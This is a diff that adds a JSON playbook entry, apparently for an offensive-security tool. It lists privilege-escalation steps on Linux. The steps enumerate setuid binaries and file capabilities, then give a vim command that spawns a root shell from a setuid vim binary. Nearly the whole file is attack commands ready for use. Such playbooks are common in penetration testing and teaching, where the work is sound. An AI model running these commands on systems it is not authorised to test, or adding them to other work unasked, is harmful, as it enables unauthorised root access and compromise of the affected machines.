@@ -1,0 +1,25 @@
+{
+	"name": "Setuid and Capabilities Exploitation",
+	"description": "Leverage SUID binaries or file capabilities for root.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Find SUID Binaries",
+			"command": "find / -perm -4000 -type f 2>/dev/null",
+			"description": "Locate setuid-root programs."
+		},
+		{
+			"index": 2,
+			"name": "Capabilities",
+			"command": "getcap -r / 2>/dev/null",
+			"description": "Find binaries with elevated caps."
+		},
+		{
+			"index": 3,
+			"name": "Exploit Example (vim)",
+			"command": "/usr/bin/vim -c ':py import os; os.system(\"/bin/sh\")'",
+			"description": "Spawn root shell from SUID vim."
+		}
+	]
+}
